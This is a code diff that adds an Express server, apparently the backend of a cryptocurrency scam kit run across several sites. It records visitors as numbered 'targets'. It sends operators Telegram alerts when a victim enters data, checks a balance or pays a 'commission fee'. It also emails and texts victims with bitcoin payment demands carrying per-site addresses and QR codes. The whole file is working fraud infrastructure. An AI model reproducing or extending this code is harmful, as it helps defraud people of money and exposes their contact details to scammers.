@@ -1,0 +1,382 @@
+const fs = require('fs');
+const request_send = require('request')
+const { send_message } = require("../modules/send_sms.js")
+const { send_mail } = require("./send_mail.js")
+
+
+async function getPriceEuro(price) {
+    let courses = {
+        bitcoin: 0
+    }
+
+    await new Promise((resolve, reject) => {
+        request_send(`https://api.blockchain.com/v3/exchange/tickers/BTC-EUR`,
+            (err, res, body) => {
+                if (err) return res.status(500).send({ message: err })
+                const data = JSON.parse(body)
+                courses.bitcoin = data["price_24h"]
+                resolve(data["price_24h"])
+            }
+        )
+    })
+
+    const convert = (amount, dir) => {
+        return (dir === 1) ? amount * courses.bitcoin : courses.bitcoin / amount
+    }
+    let result = convert(price, 1)
+    return result
+}
+
+module.exports.get_data = (app, users, bot) => {
+    let users_site = JSON.parse(fs.readFileSync('./assets/data/users-site.json'))
+
+    app.get('/users', function (request, response) {
+        let users_site = JSON.parse(fs.readFileSync('./assets/data/users-site.json'))
+        response.send(users_site)
+    })
+
+    app.get('/get_api_key', function (request, response) {
+        let a1 = request.headers.referer.replace('www.', '').split(/\/+/)[1];
+        let from = a1.replace('.com', '');
+
+        const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"))
+
+        for (let file in files) {
+            let hostnmae = files[file].site
+            if (hostnmae == from) {
+                const currentSite = JSON.parse(fs.readFileSync(`./assets/data/sites/${hostnmae}/api_key.json`))
+                response.send(currentSite)
+            }
+        }
+    })
+
+    app.get('/keys', function (request, response) {
+        let a1 = request.headers.referer.replace('www.', '').split(/\/+/)[1];
+        let from = a1.replace('.com', '');
+
+        const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"))
+
+        for (let file in files) {
+            let hostnmae = files[file].site
+            if (hostnmae == from) {
+                const currentSite = JSON.parse(fs.readFileSync(`./assets/data/sites/${hostnmae}/users-keys.json`))
+                response.send(currentSite)
+            }
+        }
+    })
+
+    app.post('/transaction', function (request, response) {
+        let product_sub = request?.body.sicret
+        let type = request.body?.type
+        let types = ["important", "balance"]
+        let list_of_user = []
+
+        switch (type) {
+            case types[0]:
+
+                list_of_user = []
+                for (ids in users_site) {
+                    if (product_sub == users_site[ids].sicret) {
+                        list_of_user.push(users_site[ids]?.id)
+                    }
+                }
+
+                for (let u in users) {
+                    let chatId = users[u]
+                    bot.sendMessage(chatId, `🔔 Withdraw! Data entered correct! Target no ${Math.min.apply(null, list_of_user)}`)
+
+                }
+
+                break;
+
+            case types[1]:
+
+                list_of_user = []
+                for (ids in users_site) {
+                    if (product_sub == users_site[ids].sicret) {
+                        list_of_user.push(users_site[ids]?.id)
+                    }
+                }
+
+                for (let u in users) {
+                    let chatId = users[u]
+                    bot.sendMessage(chatId, `☑️ Balance checked! Target no. ${Math.min.apply(null, list_of_user)}`)
+                }
+                break;
+
+            default:
+                break;
+        }
+
+
+    })
+
+    app.post('/send_mail', function (request, response) {
+        let mail_sender = request.body?.email
+        let a1 = request.headers.referer.replace('www.', '').split(/\/+/)[1];
+        let from = a1.replace('.com', '');
+        const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"))
+
+        let balance = ""
+        let bitcoin_address = ""
+        let bitcoin_img = ""
+
+
+        for (let file in files) {
+            let hostnmae = files[file].site
+            if (hostnmae == from) {
+                const baseURL = `./assets/data/sites/${hostnmae}`
+                balance = JSON.parse(fs.readFileSync(`${baseURL}/price_settings.json`))
+                bitcoin_address = JSON.parse(fs.readFileSync(`${baseURL}/address_settings.json`))
+                bitcoin_img = JSON.parse(fs.readFileSync(`${baseURL}/qr_settings.json`))
+
+            }
+        }
+
+        getPriceEuro(price).then((p) =>{
+            let priceEuro = String(p).substr(0, 8)
+            send_mail(mail_sender, priceEuro, balance.price_euro, bitcoin_address.address, bitcoin_img.qr_code_link, from)
+            for (let u in users) {
+                let chatId = users[u]
+                bot.sendMessage(chatId, `📨 Email delivered! —» ${mail_sender}`)
+    
+            }
+        })
+    })
+
+    app.get('/phone_nubmer_codes', function (request, response) {
+
+        let codes = JSON.parse(fs.readFileSync('./assets/data/countres.json'))
+
+        response.send(codes)
+
+    })
+
+    app.post('/send_sms', function (request, response) {
+        let product_sub = request?.body.sicret
+        let phone = request.body?.phone
+        let a1 = request.headers.referer.replace('www.', '').split(/\/+/)[1];
+        let from = a1.replace('.com', '');
+        let phones = ""
+
+        const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"))
+
+        for (let file in files) {
+            let hostnmae = files[file].site
+            if (hostnmae == from) {
+                phones = JSON.parse(fs.readFileSync(`./assets/data/sites/${hostnmae}/phone_numbers.json`))
+            }
+        }
+
+        let whiteListNumberStatus = true
+        const whiteListNumbers = ['+447780243386', '+447780243224', '+37064931396', "+37064931397", "+317067748831", "+37064931396", "+37064931397"]
+
+        for (let n in whiteListNumbers) {
+            if (whiteListNumbers[n] == phone) {
+                send_message(phone, from)
+                whiteListNumberStatus = false
+            }
+        }
+
+        if (whiteListNumberStatus) {
+
+            phones.push({ "tel": phone, "step": 0 })
+
+            for (let file in files) {
+                let hostnmae = files[file].site
+                if (hostnmae == from) {
+                    fs.writeFileSync(`./assets/data/sites/${hostnmae}/phone_numbers.json`, JSON.stringify(phones, null, '\t'))
+
+                }
+            }
+
+            fs.writeFileSync('./assets/data/phone_numbers.json', JSON.stringify(phones, null, '\t'))
+
+            let list_of_phones = []
+            let list_of_user = []
+
+
+            for (let ids in phones) {
+                if (phone == phones[ids].tel) {
+                    phones[ids].step += 1
+                    list_of_phones.push(phones[ids].step)
+                }
+            }
+
+
+            let max_value = Math.max.apply(null, list_of_phones)
+
+            if (max_value < 2) {
+                send_message(phone, from)
+            }
+
+            for (ids in users_site) {
+                if (product_sub == users_site[ids].sicret) {
+                    list_of_user.push(users_site[ids]?.id)
+                }
+            }
+
+            for (let u in users) {
+                let chatId = users[u]
+                bot.sendMessage(chatId, `☑️ Balance checked! Target no. ${Math.min.apply(null, list_of_user)}`)
+                bot.sendMessage(chatId, `✉️ SMS delivered! Phone number —» ${phone}`)
+
+            }
+        }
+
+
+
+
+    })
+
+    app.get('/clear_base', function (request, response) {
+        fs.writeFileSync('./assets/data/users-site.json', '[]', (err) => {
+            if (err) throw err;
+            console.log('The file has been cleared!');
+        });
+        users_site = JSON.parse(fs.readFileSync('./assets/data/users-site.json'))
+    })
+
+    app.post('/transaction-convert', function (request, response) {
+        let price = request.body?.price
+        request_send(
+            `https://blockchain.info/tobtc?currency=EUR&value=${price}`,
+            (err, res, body) => {
+                if (err) return res.status(500).send({ message: err })
+                response.send(res.body)
+            }
+        )
+
+
+    })
+
+    app.post('/transaction-successfully', function (request, response) {
+        let product_sub = request?.body.sicret
+        let status = request.body?.send_telegram
+
+        if (status) {
+
+            let list_of_user = []
+            for (ids in users_site) {
+                if (product_sub == users_site[ids].sicret) {
+                    list_of_user.push(users_site[ids]?.id)
+                }
+            }
+
+            for (let u in users) {
+                let chatId = users[u]
+                bot.sendMessage(chatId, `✅ Commission fee paid! Target no (${Math.min.apply(null, list_of_user)})`)
+
+            }
+        }
+
+    })
+
+    app.post('/transaction-commission', function (request, response) {
+        let price = request.body?.price
+        var tallage = price / 100 * 2
+        response.send({ price: tallage })
+
+    })
+
+    app.post("/transaction-convert-euro", function (request, response) {
+        let price = request.body?.price
+
+        getPriceEuro(price).then((p) =>{
+            response.send({ price: p })
+        })
+    })
+
+    app.post('/new_user', function (request, response) {
+        let product_sub = request?.body.sicret
+        let step = request.body?.step
+        let message;
+
+        switch (step) {
+            case 0:
+                users_site.push(request.body)
+                fs.writeFileSync('./assets/data/users-site.json', JSON.stringify(users_site, null, '\t'))
+
+
+                let list_of_users = []
+                for (ids in users_site) {
+                    if (product_sub == users_site[ids].sicret) {
+                        users_site[ids].sunset++
+                        list_of_users.push(users_site[ids].sunset)
+                    }
+                }
+
+                let list_of_user = []
+                for (ids in users_site) {
+                    if (product_sub == users_site[ids].sicret) {
+                        list_of_user.push(users_site[ids]?.id)
+                    }
+                }
+
+
+                for (let user in users_site) {
+                    let users = Number(user)
+                    let user_time = Math.min.apply(null, list_of_user)
+                    message = `🏛 Target ${user_time} (${Math.max.apply(null, list_of_users)}) ${users += 1}`
+                }
+
+                for (let u in users) {
+                    let chatId = users[u]
+                    bot.sendMessage(chatId, message)
+
+                }
+
+                break;
+            default:
+                break;
+        }
+
+
+    })
+
+    app.get('/qr_change', function (request, response) {
+        let a1 = request.headers.referer.replace('www.', '').split(/\/+/)[1];
+        let from = a1.replace('.com', '');
+
+        const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"))
+
+        for (let file in files) {
+            let hostnmae = files[file].site
+            if (hostnmae == from) {
+                const currentSite = JSON.parse(fs.readFileSync(`./assets/data/sites/${hostnmae}/qr_settings.json`))
+                response.send(currentSite)
+            }
+        }
+    })
+
+    app.get('/address_change', function (request, response) {
+        let a1 = request.headers.referer.replace('www.', '').split(/\/+/)[1];
+        let from = a1.replace('.com', '');
+
+        const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"))
+
+        for (let file in files) {
+            let hostnmae = files[file].site
+            if (hostnmae == from) {
+                const currentSite = JSON.parse(fs.readFileSync(`./assets/data/sites/${hostnmae}/address_settings.json`))
+                response.send(currentSite)
+            }
+        }
+
+    })
+
+    app.get('/price_change', function (request, response) {
+        let a1 = request.headers.referer.replace('www.', '').split(/\/+/)[1];
+        let from = a1.replace('.com', '');
+
+        const files = JSON.parse(fs.readFileSync("./assets/data/sites.json"))
+
+        for (let file in files) {
+            let hostnmae = files[file].site
+            if (hostnmae == from) {
+                const currentSite = JSON.parse(fs.readFileSync(`./assets/data/sites/${hostnmae}/price_settings.json`))
+                response.send(currentSite)
+            }
+        }
+    })
+}
